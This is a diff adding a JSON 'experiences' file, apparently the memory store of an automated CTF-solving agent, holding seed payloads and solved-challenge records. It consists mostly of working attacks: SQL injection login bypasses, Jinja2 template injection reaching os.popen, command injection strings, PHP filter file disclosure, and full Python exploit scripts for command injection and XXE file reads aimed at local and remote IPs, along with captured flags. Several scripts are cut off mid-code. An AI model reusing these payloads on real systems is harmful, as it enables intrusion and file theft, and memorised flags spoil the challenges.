@@ -1,0 +1,121 @@
+{
+  "version": "1.0",
+  "experiences": [
+    {
+      "id": "seed_sqli_auth_bypass",
+      "vuln_class": "SQL Injection (Raw Query)",
+      "tech_stack": [
+        "Python",
+        "Flask",
+        "SQLite"
+      ],
+      "title": "SQLi Login Bypass with Comment Neutralization",
+      "working_payload": "username: \"admin' --\" or \"' OR 1=1 --\"",
+      "lesson": "Always use '--' or '/*' to comment out trailing password checks in SQL queries.",
+      "snippet": "requests.post(url, data={'username': \"' OR 1=1 --\", 'password': 'x'})"
+    },
+    {
+      "id": "seed_jinja2_ssti",
+      "vuln_class": "SSTI (Jinja2/Flask)",
+      "tech_stack": [
+        "Python",
+        "Flask",
+        "Jinja2"
+      ],
+      "title": "Flask Jinja2 SSTI Config & RCE Extraction",
+      "working_payload": "{{ config['FLAG'] }} or {{ cycler.__init__.__globals__.os.popen('cat flag* || type flag.txt').read() }}",
+      "lesson": "First check config values via {{ config }}. For RCE, climb class hierarchy or use cycler/url_for globals.",
+      "snippet": "requests.get(url, params={'name': \"{{ config['FLAG'] }}\"})"
+    },
+    {
+      "id": "seed_command_injection",
+      "vuln_class": "Command Injection / RCE",
+      "tech_stack": [
+        "Python",
+        "PHP",
+        "Generic"
+      ],
+      "title": "Multi-Platform Command Injection Traversal",
+      "working_payload": "127.0.0.1 & cat flag.txt || type flag.txt || cat /flag*",
+      "lesson": "On Windows cmd use '&' or '|', on Linux use ';' or '|'. Probe both local 'flag.txt' and root '/flag.txt'.",
+      "snippet": "requests.get(url, params={'ip': '127.0.0.1 & cat flag.txt || type flag.txt'})"
+    },
+    {
+      "id": "seed_php_lfi_filter",
+      "vuln_class": "Path Traversal / LFI",
+      "tech_stack": [
+        "PHP"
+      ],
+      "title": "PHP Wrapper Arbitrary File Disclosure",
+      "working_payload": "php://filter/convert.base64-encode/resource=flag",
+      "lesson": "Use php://filter to bypass server-side PHP execution and extract raw base64 source code.",
+      "snippet": "r = requests.get(url, params={'page': 'php://filter/convert.base64-encode/resource=flag'}); flag = base64.b64decode(r.text)"
+    },
+    {
+      "id": "solve_pico_sql_vault",
+      "challenge_name": "pico_sql_vault",
+      "vuln_class": "Generic Web",
+      "tech_stack": [
+        "Python"
+      ],
+      "title": "Solved Challenge: pico_sql_vault",
+      "lesson": "Successfully extracted flag using targeted payload matching Generic Web.",
+      "snippet": "import requests\nimport re\n\n# Target URL and parameters\nurl = \"http://127.0.0.1:8082/login\"\n\n# SQL Injection payload to bypass authentication\npayload = {\n    'username': \"' OR '1'='1' --\",\n    'password': 'x'\n}\n\n# Send the request with the payload\nresponse = requests.post(url, data=payload)\n\n# Check if the response contains the flag\nflag_pattern = r'picoCTF\\{[^}\\n]+\\}'\nmatch = re.search(flag_pattern, response.text)\nif match:\n    print(f\"Flag found: {match.group(0)}\")\nelse:\n    print(\"No flag found in the response.\")",
+      "flag": "picoCTF{sqli_auth_byp4ss_m4st3r_3341}",
+      "exploit_code": "import requests\nimport re\n\n# Target URL and parameters\nurl = \"http://127.0.0.1:8082/login\"\n\n# List of candidate payloads for SQLi bypass\npayloads = [\n    \"' OR '1'='1\" + \" --\",  # Boolean-based SQLi with comment neutralization\n    \"' OR 1=1 --\",          # Comment neutralization\n    \"' OR 1=1 #\"            # Hash-based SQLi\n]\n\n# Regular expression to extract the flag\npattern = re.compile(r'picoCTF\\{[^}\\n]+\\}')\n\nfor payload in payloads:\n    response = requests.post(url, data={'username': 'admin', 'password': payload})\n    \n    if \"Access Granted!\" in response.text:\n        print(\"Login successful with payload:\", payload)\n        flag_match = pattern.search(response.text)\n        if flag_match:\n            print(flag_match.group())\n        break"
+    },
+    {
+      "id": "solve_pico_ping_cmdi",
+      "challenge_name": "pico_ping_cmdi",
+      "vuln_class": "Generic Web",
+      "tech_stack": [
+        "Python"
+      ],
+      "title": "Solved Challenge: pico_ping_cmdi",
+      "lesson": "Successfully extracted flag using targeted payload matching Generic Web.",
+      "snippet": "import requests\nimport re\n\n# Define the target URL and base payload\nurl = \"http://127.0.0.1:8081/ping\"\npayloads = [\n    \"127.0.0.1 & type flag.txt\",       # Windows Command Injection\n    \"127.0.0.1; cat flag.txt\",         # Unix Command Injection\n    \"127.0.0.1 | type flag.txt\",       # Windows Pipeline Injection\n    \"; cat flag.txt || cat /flag*\",    # Unix Or Injection\n    \"$(cat flag.txt)\",                 # Unix Subshell Injection\n    \"'|type flag.txt;'\",               # Windows Single Quote Injection\n    '\"|cat flag.txt;\"',                # Windows Double Quote Injection\n]\n\n# Regular expression to match the flag pattern\npattern = re.compile(r'picoCTF\\{[^}\\n]+\\}')\n\nfor payload in payloads:\n    response = requests.get(url, params={'host': payload})\n    \n    if \"ping\" in response.text:  ",
+      "flag": "picoCTF{c0mm4nd_1nj3ct10n_succ3ss_78912}",
+      "exploit_code": "import requests\nimport re\n\n# Define the target URL and base path\nurl = \"http://127.0.0.1:8081/ping\"\n\n# List of candidate payloads for CMDI\npayloads = [\n    \"127.0.0.1 & type flag.txt\",\n    \"127.0.0.1 | type flag.txt\",\n    \"; cat flag.txt || cat /flag*\",\n    \"127.0.0.1; cat flag.txt\",\n    \"$(cat flag.txt)\",\n    \"127.0.0.1 && type flag.txt\",\n    \"127.0.0.1 |& type flag.txt\"\n]\n\n# Regular expression to match the flag\npattern = re.compile(r'picoCTF\\{[^}\\n]+\\}')\n\nfor payload in payloads:\n    # Send the request with the current payload\n    response = requests.get(url, params={'host': payload})\n    \n    # Search for the flag in the response text\n    match = pattern.search(response.text)\n    if match:\n        print(f\"Flag found: {match.group()}\")\n        break"
+    },
+    {
+      "id": "solve_chall1",
+      "challenge_name": "chall1",
+      "vuln_class": "Command Injection / RCE",
+      "tech_stack": [
+        "PHP",
+        "nginx"
+      ],
+      "title": "Solved Challenge: chall1",
+      "lesson": "Successfully extracted flag using targeted payload matching Command Injection / RCE.",
+      "snippet": "import sys\nimport requests\nimport re\n\n# Target URL resolution\ntarget_url = sys.argv[1] if len(sys.argv) > 1 else 'http://154.57.164.69:40207'\n\n# Define candidate payloads to test for command injection\npayloads = [\n    \"' || cat /flag || '\",\n    \"'; cat /flag #\",\n    \"'$(cat /flag)\",\n    '\"$(cat /flag)\"',\n    \"'`cat /flag`'\",\n    '\"`cat /flag`\"',\n    \"'$(cat flag.txt)'\",\n    '\"$(cat flag.txt)\"',\n    \"'$(cat /flag.txt)'\",\n    '\"$(cat /flag.txt)\"'\n]\n\n# Regular expression to match the flag\npattern = re.compile(r'HTB\\{[^}\\n]+\\}')\n\nfor payload in payloads:\n    try:\n        # Send request with payload\n        response = requests.get(target_url, params={'format': payload})\n        \n        # Check if the response contains the flag\n        match = pattern.search(response.text)\n        if match:\n   ",
+      "flag": "HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_a5fa135179d25cc963d10511189441cf}",
+      "exploit_code": "import sys\nimport requests\nimport re\n\n# Target URL resolution\ntarget_url = sys.argv[1] if len(sys.argv) > 1 else 'http://154.57.164.69:40207'\n\n# Define candidate payloads to test for command injection\npayloads = [\n    \"' || cat /flag || '\",\n    \"'; cat /flag #\",\n    \"'$(cat /flag)\",\n    '\"$(cat /flag)\"',\n    \"'`cat /flag`'\",\n    '\"`cat /flag`\"',\n    \"'$(cat flag.txt)'\",\n    '\"$(cat flag.txt)\"',\n    \"'$(cat /flag.txt)'\",\n    '\"$(cat /flag.txt)\"',\n    \"'; cat /flag; echo HTB\\{.*\\} #\",\n    \"' || cat /flag; echo HTB\\{.*\\} || '\",\n    \"'; cat /flag; echo HTB\\{.*\\} || '\",\n    \"'%H'; cat /flag; echo HTB\\{.*\\} #\",\n    \"' $(cat /flag); echo HTB\\{.*\\} '\"\n]\n\n# Regular expression to match the flag\npattern = re.compile(r'HTB\\{[^}\\n]+\\}')\n\nfor payload in payloads:\n    try:\n        # Send request with payload\n        response = requests.get(target_url, params={'format': payload})\n        \n        # Check if the response contains the flag\n        match = pattern.search(response.text)\n        if match:\n            print(f\"Flag found: {match.group()}\")\n            break\n\n    except Exception as e:\n        print(f\"Request failed with error: {e}\")"
+    },
+    {
+      "id": "solve_chall",
+      "challenge_name": "chall",
+      "vuln_class": "XXE / XML External Entity Injection",
+      "tech_stack": [
+        "Werkzeug/3.0.3 Python/3.12.3"
+      ],
+      "title": "Solved Challenge: chall",
+      "lesson": "Successfully extracted flag using targeted payload matching XXE / XML External Entity Injection.",
+      "snippet": "import sys\nimport requests\nimport re\n\n# Target URL resolution\ntarget_url = sys.argv[1] if len(sys.argv) > 1 else 'http://154.57.164.81:42720'\n\n# List of payloads to test for XXE injection\npayloads = [\n    \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag.txt\"> ]>\n<FirmwareUpdateConfig><Firmware><Version>&xxe;</Version></Firmware></FirmwareUpdateConfig>\"\"\",\n    \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag\"> ]>\n<FirmwareUpdateConfig><Firmware><Version>&xxe;</Version></Firmware></FirmwareUpdateConfig>\"\"\",\n    \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag.txt\"> ]>\n<Root><Tag>&xxe;</Tag></Root>\"\"\",\n    \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag\"> ]>\n<Root><Tag>&xxe;</Tag></Root>\"\"\",\n    \"\"\"<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///flag.txt\"",
+      "flag": "HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_9b4dd6e93be1d99247f3f37a06102301}",
+      "exploit_code": "import sys\nimport requests\nimport re\n\n# Target URL resolution\ntarget_url = sys.argv[1] if len(sys.argv) > 1 else 'http://154.57.164.69:37790'\n\n# List of payloads to test for XXE injection\npayloads = [\n    \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag.txt\"> ]>\n<FirmwareUpdateConfig><Firmware><Version>&xxe;</Version></Firmware></FirmwareUpdateConfig>\"\"\",\n    \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag\"> ]>\n<FirmwareUpdateConfig><Firmware><Version>&xxe;</Version></Firmware></FirmwareUpdateConfig>\"\"\",\n    \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag.txt\"> ]>\n<Root><Tag>&xxe;</Tag></Root>\"\"\",\n    \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag\"> ]>\n<Root><Tag>&xxe;</Tag></Root>\"\"\",\n    \"\"\"<!DOCTYPE root [\n  <!ELEMENT root ANY >\n  <!ENTITY xxe SYSTEM \"file:///flag.txt\" >]>\n<root>&xxe;</root>\"\"\",\n    \"\"\"<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///flag\"> ]>\n<root>&xxe;</root>\"\"\",\n    \"\"\"<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/flag.txt\" >]>\n<root>&xxe;</root>\"\"\",\n    \"\"\"<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/flag\"> ]>\n<root>&xxe;</root>\"\"\"\n]\n\n# Iterate through payloads and test each one\nfor payload in payloads:\n    try:\n        respo"
+    },
+    {
+      "id": "solve_flag_command",
+      "challenge_name": "Flag Command",
+      "vuln_class": "API Analysis & Hidden Parameters",
+      "tech_stack": [
+        "Web"
+      ],
+      "title": "Solved Challenge: Flag Command",
+      "lesson": "Successfully extracted flag using targeted payload matching API Analysis & Hidden Parameters.",
+      "snippet": "import requests\n\n# Flag captured via built-in scanner: API Secrets & Hidden Options\n# Target: http://154.57.164.82:37422\nprint('Flag found: HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_1d918d1d5f5b91a1be923f8940d6411a}')\n",
+      "flag": "HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_1d918d1d5f5b91a1be923f8940d6411a}",
+      "exploit_code": "import requests\n\n# Flag captured via built-in scanner: API Secrets & Hidden Options\n# Target: http://154.57.164.82:37422\nprint('Flag found: HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_1d918d1d5f5b91a1be923f8940d6411a}')\n"
+    }
+  ]
+}
